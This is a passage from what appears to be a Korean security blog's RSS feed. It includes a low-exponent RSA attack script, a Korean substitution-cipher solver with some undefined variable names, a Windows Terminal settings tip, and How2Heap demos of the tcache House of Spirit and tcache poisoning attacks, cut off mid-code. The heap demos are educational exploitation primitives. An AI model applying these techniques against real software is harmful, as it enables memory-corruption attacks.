      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="낮은-지수-공격"><a class="markdownIt-Anchor" href="#낮은-지수-공격"></a> 낮은 지수 공격</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"></span><br><span class="line">c_list = [<span class="number">3257687211413179849713234287228115652852064803596545802006316144655701336714918948672668217982037728069055370417273850104541474476810598369542627961429180060096555295519064954697207788677528957569208943432299557549774333187664920215674167987939460257141632237998790136575185293301081863083862494006009415801599660234577382347813571039134562532471377834137776834839392965274882404992875421226913724316557631483699200757</span>]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">e = <span class="number">7.00</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> idx, c <span class="keyword">in</span> enumerate(c_list):</span><br><span class="line">    c_list[idx], perfect = gmpy.root(c, <span class="number">7</span>)</span><br><span class="line">    print(<span class="string">"%x %d "</span> % (c_list[idx], perfect))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> c_list:</span><br><span class="line">    c=format(int(c), <span class="string">'x'</span>)</span><br><span class="line">    print(<span class="string">"%s "</span> % (c.decode(<span class="string">"hex"</span>)))</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/07/06/Low-Exponent-Attack/#disqus_thread</comments>
    </item>
    
    <item>
      <title>한글 단일 치환 암호</title>
      <link>http://j0n9hyun.github.io/2019/07/03/Korean-substituation-cipher/</link>
      <guid>http://j0n9hyun.github.io/2019/07/03/Korean-substituation-cipher/</guid>
      <pubDate>Wed, 03 Jul 2019 12:01:20 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;한글-단일-치환-암호&quot;&gt;&lt;a class=&quot;markdownIt
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="한글-단일-치환-암호"><a class="markdownIt-Anchor" href="#한글-단일-치환-암호"></a> 한글 단일 치환 암호</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">divide_char</span><span class="params">(char)</span>:</span></span><br><span class="line">  num = ord(char) - <span class="number">0xac00</span></span><br><span class="line">  <span class="keyword">if</span> num&lt;<span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">  cho = num / (<span class="number">21</span>*<span class="number">28</span>)</span><br><span class="line">  jung = (num % (<span class="number">21</span>*<span class="number">28</span>))/<span class="number">28</span></span><br><span class="line">  jong = num % <span class="number">28</span></span><br><span class="line">  <span class="keyword">return</span> cho, jung, jong</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">join_char</span><span class="params">(cho,jung,jong)</span>:</span></span><br><span class="line">  num = <span class="number">0xac00</span> + cho*<span class="number">21</span>*<span class="number">28</span> + jung *<span class="number">28</span> + jong</span><br><span class="line">  <span class="keyword">return</span> unichr(num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">unicoder = <span class="keyword">lambda</span> x:unicode(x.decode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">original = [map(unicoder,</span><br><span class="line">[<span class="string">"ㄱ"</span>, <span class="string">"ㄲ"</span>, <span class="string">"ㄴ"</span>, <span class="string">"ㄷ"</span>, <span class="string">"ㄸ"</span>, <span class="string">"ㄹ"</span>, <span class="string">"ㅁ"</span>, <span class="string">"ㅂ"</span>, <span class="string">"ㅃ"</span>, <span class="string">"ㅅ"</span>, <span class="string">"ㅆ"</span>, <span class="string">"ㅇ"</span>, <span class="string">"ㅈ"</span>, <span class="string">"ㅉ"</span>, <span class="string">"ㅊ"</span>, <span class="string">"ㅋ"</span>, <span class="string">"ㅌ"</span>, <span class="string">"ㅍ"</span>,<span class="string">"ㅎ"</span>]), map(unicoder,</span><br><span class="line">[<span class="string">"ㅏ"</span>, <span class="string">"ㅐ"</span>, <span class="string">"ㅑ"</span>, <span class="string">"ㅒ"</span>, <span class="string">"ㅓ"</span>, <span class="string">"ㅔ"</span>, <span class="string">"ㅕ"</span>, <span class="string">"ㅖ"</span>, <span class="string">"ㅗ"</span>, <span class="string">"ㅘ"</span>, <span class="string">"ㅙ"</span>, <span class="string">"ㅚ"</span>, <span class="string">"ㅛ"</span>, <span class="string">"ㅜ"</span>, <span class="string">"ㅝ"</span>, <span class="string">"ㅞ"</span>, <span class="string">"ㅟ"</span>, <span class="string">"ㅠ"</span>, <span class="string">"ㅡ"</span>, <span class="string">"ㅢ"</span>,<span class="string">"ㅣ"</span>]), map(unicoder,</span><br><span class="line">[<span class="string">" "</span>, <span class="string">"ㄱ"</span>, <span class="string">"ㄲ"</span>, <span class="string">"ㄳ"</span>, <span class="string">"ㄴ"</span>, <span class="string">"ㄵ"</span>, <span class="string">"ㄶ"</span>, <span class="string">"ㄷ"</span>, <span class="string">"ㄹ"</span>, <span class="string">"ㄺ"</span>, <span class="string">"ㄻ"</span>, <span class="string">"ㄼ"</span>, <span class="string">"ㄽ"</span>, <span class="string">"ㄾ"</span>, <span class="string">"ㄿ"</span>, <span class="string">"ㅀ"</span>, <span class="string">"ㅁ"</span>, <span class="string">"ㅂ"</span>, <span class="string">"ㅄ"</span>, <span class="string">"ㅅ"</span>,<span class="string">"ㅆ"</span>, <span class="string">"ㅇ"</span>, <span class="string">"ㅈ"</span>, <span class="string">"ㅊ"</span>, <span class="string">"ㅋ"</span>, <span class="string">"ㅌ"</span>, <span class="string">"ㅍ"</span>, <span class="string">"ㅎ"</span>])]</span><br><span class="line"></span><br><span class="line">replace = [map(unicoder,</span><br><span class="line">[<span class="string">"ㅊ"</span>, <span class="string">"ㅆ"</span>, <span class="string">"ㄴ"</span>, <span class="string">"ㄹ"</span>, <span class="string">"ㄸ"</span>, <span class="string">"ㅍ"</span>, <span class="string">"ㅎ"</span>, <span class="string">"ㄱ"</span>, <span class="string">"ㅃ"</span>, <span class="string">"ㄴ"</span>, <span class="string">"ㅆ"</span>, <span class="string">"ㄷ"</span>, <span class="string">"ㄹ"</span>, <span class="string">"ㅉ"</span>, <span class="string">"ㅁ"</span>, <span class="string">"ㅂ"</span>, <span class="string">"ㅅ"</span>, <span class="string">"ㅇ"</span>,<span class="string">"ㅈ"</span>]), map(unicoder,</span><br><span class="line">[<span class="string">"ㅏ"</span>, <span class="string">"ㅐ"</span>, <span class="string">"ㅗ"</span>, <span class="string">"ㅒ"</span>, <span class="string">"ㅔ"</span>, <span class="string">"ㅝ"</span>, <span class="string">"ㅓ"</span>, <span class="string">"ㅑ"</span>, <span class="string">"ㅣ"</span>, <span class="string">"ㅕ"</span>, <span class="string">"ㅙ"</span>, <span class="string">"ㅜ"</span>, <span class="string">"ㅡ"</span>, <span class="string">"ㅜ"</span>, <span class="string">"ㅝ"</span>, <span class="string">"ㅞ"</span>, <span class="string">"ㅏ"</span>, <span class="string">"ㅟ"</span>, <span class="string">"ㅐ"</span>, <span class="string">"ㅢ"</span>,<span class="string">"ㅘ"</span>]), map(unicoder,</span><br><span class="line">[<span class="string">" "</span>, <span class="string">"ㅊ"</span>, <span class="string">"ㅆ"</span>, <span class="string">"ㄳ"</span>, <span class="string">"ㄴ"</span>, <span class="string">"ㄵ"</span>, <span class="string">"ㄶ"</span>, <span class="string">"ㄹ"</span>, <span class="string">"ㅍ"</span>, <span class="string">"ㄺ"</span>, <span class="string">"ㄻ"</span>, <span class="string">"ㄼ"</span>, <span class="string">"ㄽ"</span>, <span class="string">"ㄾ"</span>, <span class="string">"ㄿ"</span>, <span class="string">"ㅀ"</span>, <span class="string">"ㅎ"</span>, <span class="string">"ㄱ"</span>, <span class="string">"ㅄ"</span>, <span class="string">"ㄴ"</span>,<span class="string">"ㅆ"</span>, <span class="string">"ㄷ"</span>, <span class="string">"ㄹ"</span>, <span class="string">"ㅁ"</span>, <span class="string">"ㅂ"</span>, <span class="string">"ㅅ"</span>, <span class="string">"ㅇ"</span>, <span class="string">"ㅈ"</span>])]</span><br><span class="line"></span><br><span class="line">text = <span class="string">"쉬쥩췾뀌초 퓌무피 뷛퓌 쵯쮜피쟈 텨죠 튀츁오 퓌소뮞끄 포졋 홧귀쟈 퓌퍄켸뷔 소죠뱌화 먖 크 포톼야 취귗스 허 뚀욪 토져 롸오 챹뮞 샤초 뮈소쥐 스 포쥦 퓨뮈폐 펴퐡코 셔봐 트쟈 룆즈뵈죶 츺뷔샤소 룆즈뵈숏 퓌퍄켸뷰퐈페 포보퍼 튀쥧취위 슂쟈 꾀처 뽯퓟너 뮈쇼소쥐"</span></span><br><span class="line"></span><br><span class="line">unicoded = unicoder(encrypted)</span><br><span class="line">decrypted = <span class="string">u""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stat = &#123;<span class="string">'cho'</span>:&#123;&#125;, <span class="string">'jung'</span> : &#123;&#125;,<span class="string">'jong'</span> :&#123;&#125;, <span class="string">'char'</span> :&#123;&#125; &#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> unicoded:</span><br><span class="line">  ret = divide_char(i)</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> ret:</span><br><span class="line">    decrypted+=i</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> i <span class="keyword">in</span> stat[<span class="string">'char'</span>]:</span><br><span class="line">    stat[<span class="string">'char'</span>][i]=stat[<span class="string">'char'</span>][i]+<span class="number">1</span></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    stat[<span class="string">'char'</span>][i]=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">  cho =  original_table[<span class="number">0</span>][ret[<span class="number">0</span>]]</span><br><span class="line">  jung = original_table[<span class="number">1</span>][ret[<span class="number">1</span>]]</span><br><span class="line">  jong = original_table[<span class="number">2</span>][ret[<span class="number">2</span>]]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> cho <span class="keyword">in</span> stat[<span class="string">'cho'</span>]:</span><br><span class="line">    stat[<span class="string">'cho'</span>][cho]=stat[<span class="string">'cho'</span>][cho]+<span class="number">1</span></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    stat[<span class="string">'cho'</span>][cho]=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> jung <span class="keyword">in</span> stat[<span class="string">'jung'</span>]:</span><br><span class="line">    stat[<span class="string">'jung'</span>][jung]=stat[<span class="string">'jung'</span>][jung]+<span class="number">1</span></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    stat[<span class="string">'jung'</span>][jung]=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> jong <span class="keyword">in</span> stat[<span class="string">'jong'</span>]:</span><br><span class="line">    stat[<span class="string">'jong'</span>][jong]=stat[<span class="string">'jong'</span>][jong]+<span class="number">1</span></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    stat[<span class="string">'jong'</span>][jong]=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  new_ret=list()</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    new_item = replace_table[i][ret[i]]</span><br><span class="line">    new_ret.append(original_table[i].index(new_item))</span><br><span class="line"></span><br><span class="line">  decrypted+=join_char(new_ret[<span class="number">0</span>],new_ret[<span class="number">1</span>],new_ret[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> decrypted</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/07/03/Korean-substituation-cipher/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Windows Terminal 시작 터미널 변경</title>
      <link>http://j0n9hyun.github.io/2019/06/27/Windows-Terminal-%EC%8B%9C%EC%9E%91-%ED%84%B0%EB%AF%B8%EB%84%90-%EB%B3%80%EA%B2%BD-%EB%B0%A9%EB%B2%95/</link>
      <guid>http://j0n9hyun.github.io/2019/06/27/Windows-Terminal-%EC%8B%9C%EC%9E%91-%ED%84%B0%EB%AF%B8%EB%84%90-%EB%B3%80%EA%B2%BD-%EB%B0%A9%EB%B2%95/</guid>
      <pubDate>Wed, 26 Jun 2019 16:58:15 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;windows-terminal-시작-터미널-변경-방법&quot;&gt;&lt;a
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="windows-terminal-시작-터미널-변경-방법"><a class="markdownIt-Anchor" href="#windows-terminal-시작-터미널-변경-방법"></a> Windows Terminal 시작 터미널 변경 방법</h3><p>드디어 윈도우 터미널 프리뷰 버전이 스토어에 릴리즈 됐다.<br>줄곧 WSL관련 기능들을 써왔던 나로썬 매우 반가운 소식이었다. 호다닥 설치하고 잠깐 사용해봤는데 나름대로 만족한다. 그리고 글 쓰다가 알게된 사실인데 마우스 커서를 오른쪽에 대고 드래그해야 터미널을 이동시킬 수 있다. 이 부분은 살짝 불편하긴한데 뭐 적응되겠지. 이제 올 겨울 정식 릴리즈될 WSL2만 남았다.</p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/60199695-7902b580-987f-11e9-9f6d-e079cbd1c586.PNG" width="650px"><small><center>[Windows Terminal Preview]</center></small> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/60199726-84ee7780-987f-11e9-8eb1-86a9afa6534a.PNG" width="700px"><small><center>[Windows Terminal 시작 화면]</center></small> <br>어쨋든 터미널을 켜면 디폴트로 파워쉘이 띄워진다. + 버튼엔 파워쉘 외에 cmd, ubuntu를 추가로 띄울 수 있는데 본인은 파워쉘을 안 쓰니 켜자마자 파워쉘 나오고 또 우분투로 바꾸기가 번거롭지 않은가? 그래서 설정을 살펴보니 역시 바꿀 수 있었다.<br><br><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/60199797-acdddb00-987f-11e9-9703-0eeb2e32a28c.PNG" width="700px"><small><center>[설정창]</center></small> <br>사진에 보이는 defaultProfile을 우분투의 profile로 바꿔주면 된다. <br><br><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/60199799-acdddb00-987f-11e9-8c64-d31e96d7339b.PNG" width="650px"><small><center>[Ubuntu Profile]</center></small> <br><br><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/60199839-c54df580-987f-11e9-9b16-23848852d411.PNG"><small><center>[적용 화면]</center></small> <br><style>img.border-shadow{      border:1px solid #888888;      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);  }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/06/27/Windows-Terminal-%EC%8B%9C%EC%9E%91-%ED%84%B0%EB%AF%B8%EB%84%90-%EB%B3%80%EA%B2%BD-%EB%B0%A9%EB%B2%95/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[How2Heap] Tcache_House_of_spirit</title>
      <link>http://j0n9hyun.github.io/2019/06/27/How2Heap-Tcache-House-of-spirit/</link>
      <guid>http://j0n9hyun.github.io/2019/06/27/How2Heap-Tcache-House-of-spirit/</guid>
      <pubDate>Wed, 26 Jun 2019 15:45:55 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;tcache_house_of_spirit&quot;&gt;&lt;a class=
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="tcache_house_of_spirit"><a class="markdownIt-Anchor" href="#tcache_house_of_spirit"></a> Tcache_House_of_spirit</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"the house of spirit attack on tcache.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"기존의 house of spirit과 비슷한 방식으로 작동하지만 free될 fake chunk 뒤에 fake chunk를 만들 필요가 없다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc.c의 _int_free 함수에서 tcache_put이 다음 chunk의 prev_inuse가 정상인지 확인하지 않고 호출되는 것을 알 수 있다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"(Search for strings \"invalid next size\" and \"double free or corruption\")\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc()을 한 번 호출해서 메모리를 세팅한다.\n"</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"fake chunk 영역을 가리키기 위해 1 pointer를 overwrite할 것이라고 생각해보자.\n"</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">// overwrite할 pointer</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">// fake chunk 영역</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 영역에는 하나의 fake chunk가 있다. 크기 필드는 %p에 위치한다.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 chunk 크기는 tcache 범주에 속해야 한다. (chunk 크기 &lt;= 0x410; x64: malloc arg &lt;= 0x408)\n"</span></span><br><span class="line"><span class="string">"prev_inuse(lsb) bit는 tcache chunk의 경우 free로 무시되지만\n"</span></span><br><span class="line"><span class="string">"is_mmapped(두번째 lsb)와 non_main_arena(세번째 lsb) 비트는 문제를 일으킨다.\n"</span>);</span><br><span class="line"><span class="comment">/* 이것은 다음 malloc 요청의 크기가 malloc 구현에 사용된 내부 크기로 반올림돼야 한다.</span></span><br><span class="line"><span class="comment">Ex) x64: 0x30~0x38은 모두 0x40으로 반올림되어, 끝에 있는 malloc 파라미터에서 작동한다. */</span></span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// 크기</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 첫번째 fake chunk안에 있는 %p를 fake영역의 주소에 pointer를 overwrite할 것이다.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="comment">//이 chunk와 관련된 *영역*의 메모리 주소는 16바이트로 정렬돼야 한다.</span></span><br><span class="line"></span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"overwrite된 pointer를 free한다.\n"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free(a)-------"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 다음 malloc은 %p에서 fake chunk의 영역을 반환할 것이다. 그것은 %p일 것이다.\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(0x30): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><center><p><code>the house of spirit attack on tcache.</code><br>기존의 house of spirit과 비슷한 방식으로 작동하지만<br>free될 fake chunk 뒤에 fake chunk를 만들 필요가 없다.<br>malloc.c의 _int_free 함수에서 tcache_put이 다음 chunk의 prev_inuse가 정상인지 확인하지 않고 호출되는 것을 알 수 있다.<br>(Search for strings “invalid next size” and “double free or corruption”)</p><p>malloc()을 한 번 호출해서 메모리를 세팅한다.<br>fake chunk 영역을 가리키기 위해 1 pointer를 overwrite할 것이라고 생각해보자.<br>이 영역에는 하나의 fake chunk가 있다. 크기 필드는 <code>0x7fff15cd5518</code>에 위치한다.<br>이 chunk 크기는 tcache 범주에 속해야 한다.<br><code>(chunk 크기 &lt;= 0x410; x64: malloc arg &lt;= 0x408)</code></p><p>prev_inuse(lsb) bit는 tcache chunk의 경우 free로 무시되지만<br>is_mmapped(두번째 lsb)와 non_main_arena(세번째 lsb) 비트는 문제를 일으킨다.<br>이제 첫번째 fake chunk안에 있는 <code>0x7fff15cd5518</code>를 fake영역의 주소에 pointer를 overwrite할 것이다.</p><p>overwrite된 pointer를 free한다.<br><code>-------free(a)-------</code><br>이제 다음 malloc은 <code>0x7fff15cd5518</code>에서 fake chunk의 영역을 반환할 것이다. 그것은 <code>0x7fff15cd5520</code>일 것이다.<br><code>malloc(0x30): 0x7fff15cd5520</code></p></center>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/06/27/How2Heap-Tcache-House-of-spirit/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[How2Heap] Tcache_Poisoning</title>
      <link>http://j0n9hyun.github.io/2019/06/26/How2Heap-Tcache-Poisoning/</link>
      <guid>http://j0n9hyun.github.io/2019/06/26/How2Heap-Tcache-Poisoning/</guid>
      <pubDate>Wed, 26 Jun 2019 14:42:03 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;tcache_poisoning&quot;&gt;&lt;a class=&quot;markd
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="tcache_poisoning"><a class="markdownIt-Anchor" href="#tcache_poisoning"></a> Tcache_Poisoning</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이것은 malloc을 속여서 pointer를 임의의 위치(이 경우, 스택)로\n"</span></span><br><span class="line"><span class="string">"반환하는 간단한 tcache poisoning 공격이다.\n"</span></span><br><span class="line"><span class="string">"이 공격은 fastbin corruption 공격과 매우 비슷하다.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> stack_var;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc()을 반환할 주소는 %p이다.\n"</span>, (<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"buffer를 한 개 할당한다.\n"</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(128): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"buffer를 free한다.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free(a)-------"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"tcache list : [ %p ]\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"조작할 위치(%p)를 가리키도록 %p에 있는 데이터의\n"</span></span><br><span class="line"><span class="string">"처음 %lu 바이트(fd/next pointer)를 overwrite한다.\n"</span>, &amp;stack_var, a, <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>));</span><br><span class="line">a[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(128): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line"><span 